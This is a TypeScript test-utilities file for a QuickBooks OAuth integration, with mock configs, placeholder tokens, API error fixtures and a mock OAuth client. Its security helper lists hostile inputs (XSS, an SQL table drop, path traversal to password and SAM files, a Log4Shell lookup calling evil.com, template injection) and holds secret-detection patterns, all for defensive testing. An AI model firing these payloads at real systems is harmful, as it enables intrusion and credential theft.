import { vi } from 'vitest';
import type { QuickBooksConfig, QuickBooksTokens } from '../../integrations/quickbooks';

/**
 * OAuth Testing Utilities for QuickBooks Integration
 * Provides mock data, helper functions, and test fixtures for OAuth flow testing
 */

export const MOCK_CONFIG: QuickBooksConfig = {
  clientId: 'Intuit_QB_Test_Client_12345',
  clientSecret: 'QB_Test_Client_Secret_67890',
  scope: 'com.intuit.quickbooks.accounting',
  redirectUri: 'https://app.finhelm.ai/auth/quickbooks/callback',
  environment: 'sandbox',
};

export const MOCK_PRODUCTION_CONFIG: QuickBooksConfig = {
  ...MOCK_CONFIG,
  environment: 'production',
  redirectUri: 'https://app.finhelm.ai/auth/quickbooks/callback',
};

export const MOCK_TOKENS: QuickBooksTokens = {
  access_token: 'eyJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0.aHR0cHM6Ly9kZXZlbG9wZXIuaW50dWl0LmNvbS92Mi9zZXJ2aWNlcy9hdXRoZW50aWNhdGlvbi9vYXV0aDIuaHRtbA.kBOKCLPR8k3z9MyGD0VLMyF_OqGJUIBV9qz3qH9I8Zw',
  refresh_token: 'L011546037639L9UkbpQEeaolaMxdCc2VfVpKQC1RBpn2noGzXqXmWOUJHgsuexampletokens',
  realmId: '9130347596842384658',
  expires_in: 3600,
  token_type: 'Bearer',
  refresh_token_expires_in: 8726400,
  issued_at: Date.now(),
};

export const EXPIRED_TOKENS: QuickBooksTokens = {
  ...MOCK_TOKENS,
  issued_at: Date.now() - 4000000, // 4000 seconds ago (expired)
};

export const MOCK_REFRESH_RESPONSE = {
  token: {
    access_token: 'eyJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0.NEW_ACCESS_TOKEN_EXAMPLE',
    refresh_token: 'L011546037639L9UkbpQEeaolaMxdCc_REFRESHED_TOKEN_EXAMPLE',
    realmId: '9130347596842384658',
    expires_in: 3600,
    token_type: 'Bearer',
    refresh_token_expires_in: 8726400,
  }
};

export const MOCK_COMPANY_INFO_RESPONSE = {
  data: {
    QueryResponse: {
      CompanyInfo: [{
        Id: '1',
        CompanyName: 'Test Company LLC',
        LegalName: 'Test Company LLC',
        CompanyAddr: {
          Line1: '123 Test Street',
          City: 'Test City',
          CountrySubDivisionCode: 'CA',
          PostalCode: '12345',
          Country: 'US'
        },
        CustomerCommunicationAddr: {
          Line1: '123 Test Street',
          City: 'Test City',
          CountrySubDivisionCode: 'CA',
          PostalCode: '12345',
          Country: 'US'
        },
        FiscalYearStartMonth: 'January',
        SupportedLanguages: 'en',
        Country: 'US',
        Email: {
          Address: 'test@testcompany.com'
        },
        WebAddr: {
          URI: 'https://testcompany.com'
        },
        NameValue: [
          {
            Name: 'QBOReferencedEntityDate',
            Value: '2023-01-01'
          }
        ],
        domain: 'QBO',
        sparse: false,
        Id: '1',
        SyncToken: '0',
        MetaData: {
          CreateTime: '2023-01-01T10:00:00-08:00',
          LastUpdatedTime: '2023-06-15T14:30:00-08:00'
        }
      }]
    }
  }
};

export const OAUTH_ERROR_RESPONSES = {
  INVALID_GRANT: {
    error: 'invalid_grant',
    error_description: 'Invalid authorization code or redirect URI'
  },
  EXPIRED_CODE: {
    error: 'invalid_grant',
    error_description: 'Authorization code expired'
  },
  INVALID_CLIENT: {
    error: 'invalid_client',
    error_description: 'Client authentication failed'
  },
  INVALID_SCOPE: {
    error: 'invalid_scope',
    error_description: 'The requested scope is invalid, unknown, or malformed'
  },
  SERVER_ERROR: {
    error: 'server_error',
    error_description: 'The authorization server encountered an unexpected condition'
  }
};

export const API_ERROR_RESPONSES = {
  UNAUTHORIZED: {
    response: {
      status: 401,
      data: {
        Fault: {
          Error: [{
            Detail: 'Unauthorized. Token invalid or expired.',
            code: '401',
            element: ''
          }],
          type: 'AuthenticationFault'
        }
      }
    }
  },
  FORBIDDEN: {
    response: {
      status: 403,
      data: {
        Fault: {
          Error: [{
            Detail: 'Forbidden. Insufficient scope for this operation.',
            code: '403',
            element: ''
          }],
          type: 'AuthorizationFault'
        }
      }
    }
  },
  RATE_LIMITED: {
    response: {
      status: 429,
      data: {
        Fault: {
          Error: [{
            Detail: 'TooManyRequests. Rate limit exceeded.',
            code: '429',
            element: ''
          }],
          type: 'ThrottleFault'
        }
      }
    }
  },
  BAD_REQUEST: {
    response: {
      status: 400,
      data: {
        Fault: {
          Error: [{
            Detail: 'BadRequest. Invalid request parameters.',
            code: '400',
            element: ''
          }],
          type: 'ValidationFault'
        }
      }
    }
  },
  SERVER_ERROR: {
    response: {
      status: 500,
      data: {
        Fault: {
          Error: [{
            Detail: 'InternalServerError. Please try again later.',
            code: '500',
            element: ''
          }],
          type: 'SystemFault'
        }
      }
    }
  }
};

/**
 * Mock OAuth Client for testing
 */
export class MockOAuthClient {
  private shouldFail: boolean = false;
  private failureError: Error | null = null;
  private delay: number = 0;

  constructor() {
    this.reset();
  }

  reset() {
    this.shouldFail = false;
    this.failureError = null;
    this.delay = 0;
  }

  setFailure(error: Error) {
    this.shouldFail = true;
    this.failureError = error;
  }

  setDelay(ms: number) {
    this.delay = ms;
  }

  async createToken(url: string) {
    if (this.delay > 0) {
      await new Promise(resolve => setTimeout(resolve, this.delay));
    }

    if (this.shouldFail && this.failureError) {
      throw this.failureError;
    }

    // Parse URL to extract parameters for more realistic responses
    const urlObj = new URL(url);
    const code = urlObj.searchParams.get('code');
    const realmId = urlObj.searchParams.get('realmId');
    const state = urlObj.searchParams.get('state');

    if (!code) {
      throw new Error('Missing authorization code');
    }

    if (!realmId) {
      throw new Error('Missing realmId parameter');
    }

    return {
      token: {
        ...MOCK_TOKENS,
        realmId: realmId,
        // Include state in response for validation if needed
        state: state
      }
    };
  }

  async refresh(refreshToken: string) {
    if (this.delay > 0) {
      await new Promise(resolve => setTimeout(resolve, this.delay));
    }

    if (this.shouldFail && this.failureError) {
      throw this.failureError;
    }

    if (!refreshToken) {
      throw new Error('Missing refresh token');
    }

    return MOCK_REFRESH_RESPONSE;
  }

  getAuthUri(config: any) {
    const baseUrl = 'https://appcenter.intuit.com/connect/oauth2';
    const params = new URLSearchParams({
      client_id: config.clientId,
      scope: config.scope,
      redirect_uri: config.redirectUri,
      response_type: 'code',
      access_type: 'offline'
    });

    if (config.state) {
      params.append('state', config.state);
    }

    return `${baseUrl}?${params.toString()}`;
  }
}

/**
 * Test helper functions
 */
export class OAuthTestUtils {
  static generateSecureState(): string {
    return 'test-state-' + Math.random().toString(36).substring(2, 15);
  }

  static isValidJWT(token: string): boolean {
    // Basic JWT format check (3 parts separated by dots)
    const parts = token.split('.');
    return parts.length === 3 && parts.every(part => part.length > 0);
  }

  static parseJWT(token: string): any {
    try {
      const parts = token.split('.');
      const payload = JSON.parse(atob(parts[1]));
      return payload;
    } catch (error) {
      throw new Error('Invalid JWT token format');
    }
  }

  static isTokenExpired(tokens: QuickBooksTokens, bufferSeconds: number = 300): boolean {
    const now = Date.now();
    const issuedAt = tokens.issued_at || now;
    const expiresAt = issuedAt + (tokens.expires_in * 1000);
    const bufferTime = bufferSeconds * 1000;
    
    return now >= (expiresAt - bufferTime);
  }

  static createMockAxiosResponse(data: any, status: number = 200) {
    return {
      data,
      status,
      statusText: status === 200 ? 'OK' : 'Error',
      headers: {},
      config: {}
    };
  }

  static createMockAxiosError(status: number, data: any) {
    const error = new Error(`Request failed with status ${status}`) as any;
    error.response = {
      status,
      data,
      statusText: 'Error',
      headers: {},
      config: {}
    };
    return error;
  }

  static async waitFor(condition: () => boolean, timeout: number = 5000): Promise<void> {
    const start = Date.now();
    
    while (Date.now() - start < timeout) {
      if (condition()) {
        return;
      }
      await new Promise(resolve => setTimeout(resolve, 50));
    }
    
    throw new Error(`Condition not met within ${timeout}ms timeout`);
  }

  static mockTimers() {
    vi.useFakeTimers();
    
    return {
      advance: (ms: number) => vi.advanceTimersByTime(ms),
      restore: () => vi.useRealTimers()
    };
  }

  static expectOAuthUrl(url: string, expectedParams: Record<string, string>) {
    const urlObj = new URL(url);
    
    for (const [key, expectedValue] of Object.entries(expectedParams)) {
      const actualValue = urlObj.searchParams.get(key);
      expect(actualValue).toBe(expectedValue);
    }
  }

  static expectValidTokens(tokens: QuickBooksTokens) {
    expect(tokens.access_token).toBeTruthy();
    expect(tokens.refresh_token).toBeTruthy();
    expect(tokens.realmId).toBeTruthy();
    expect(tokens.expires_in).toBeGreaterThan(0);
    expect(tokens.token_type).toBe('Bearer');
    
    // Validate JWT format for access token
    expect(this.isValidJWT(tokens.access_token)).toBe(true);
  }

  static createRetryableError(attempt: number, maxAttempts: number = 3) {
    if (attempt < maxAttempts) {
      return this.createMockAxiosError(429, {
        Fault: {
          Error: [{ Detail: 'Rate limit exceeded. Please retry.' }]
        }
      });
    }
    
    // Final attempt succeeds
    return null;
  }
}

/**
 * Performance testing utilities
 */
export class PerformanceTestUtils {
  static async measureExecutionTime<T>(
    fn: () => Promise<T>,
    expectedMaxMs?: number
  ): Promise<{ result: T; executionTime: number }> {
    const start = performance.now();
    const result = await fn();
    const end = performance.now();
    const executionTime = end - start;
    
    if (expectedMaxMs && executionTime > expectedMaxMs) {
      throw new Error(
        `Execution time ${executionTime.toFixed(2)}ms exceeds expected maximum ${expectedMaxMs}ms`
      );
    }
    
    return { result, executionTime };
  }

  static async measureConcurrentExecutions<T>(
    fn: () => Promise<T>,
    concurrency: number,
    expectedMaxMs?: number
  ): Promise<{ results: T[]; totalTime: number; avgTime: number }> {
    const start = performance.now();
    
    const promises = Array.from({ length: concurrency }, () => fn());
    const results = await Promise.all(promises);
    
    const end = performance.now();
    const totalTime = end - start;
    const avgTime = totalTime / concurrency;
    
    if (expectedMaxMs && avgTime > expectedMaxMs) {
      throw new Error(
        `Average execution time ${avgTime.toFixed(2)}ms exceeds expected maximum ${expectedMaxMs}ms`
      );
    }
    
    return { results, totalTime, avgTime };
  }
}

/**
 * Security testing utilities
 */
export class SecurityTestUtils {
  static generateMaliciousInputs(): string[] {
    return [
      '<script>alert("xss")</script>',
      '"; DROP TABLE users; --',
      '../../../../../../etc/passwd',
      'javascript:alert("xss")',
      '${jndi:ldap://evil.com/}',
      '../../../windows/system32/config/sam',
      '{{7*7}}',
      '<%=7*7%>',
      '#{7*7}',
      '\x00\x01\x02\x03'
    ];
  }

  static validateNoSecretsInLogs(logOutput: string): void {
    const secretPatterns = [
      /client_secret[^a-zA-Z0-9]*[a-zA-Z0-9]+/i,
      /access_token[^a-zA-Z0-9]*[a-zA-Z0-9]+/i,
      /refresh_token[^a-zA-Z0-9]*[a-zA-Z0-9]+/i,
      /bearer\s+[a-zA-Z0-9]+/i,
      /password[^a-zA-Z0-9]*[a-zA-Z0-9]+/i
    ];

    for (const pattern of secretPatterns) {
      if (pattern.test(logOutput)) {
        throw new Error(`Potential secret leaked in logs: ${pattern.source}`);
      }
    }
  }

  static validateSecureUrl(url: string): void {
    const urlObj = new URL(url);
    
    if (urlObj.protocol !== 'https:' && urlObj.hostname !== 'localhost') {
      throw new Error('OAuth URLs must use HTTPS in production');
    }
    
    // Check for common security issues
    if (urlObj.searchParams.has('client_secret')) {
      throw new Error('Client secret should not be in URL parameters');
    }
  }
}

/**
 * Test data factories
 */
export class TestDataFactory {
  static createConfig(overrides: Partial<QuickBooksConfig> = {}): QuickBooksConfig {
    return {
      ...MOCK_CONFIG,
      ...overrides
    };
  }

  static createTokens(overrides: Partial<QuickBooksTokens> = {}): QuickBooksTokens {
    return {
      ...MOCK_TOKENS,
      ...overrides
    };
  }

  static createExpiredTokens(overrides: Partial<QuickBooksTokens> = {}): QuickBooksTokens {
    return {
      ...EXPIRED_TOKENS,
      ...overrides
    };
  }

  static createApiError(type: keyof typeof API_ERROR_RESPONSES) {
    return API_ERROR_RESPONSES[type];
  }

  static createOAuthError(type: keyof typeof OAUTH_ERROR_RESPONSES) {
    return new Error(JSON.stringify(OAUTH_ERROR_RESPONSES[type]));
  }
}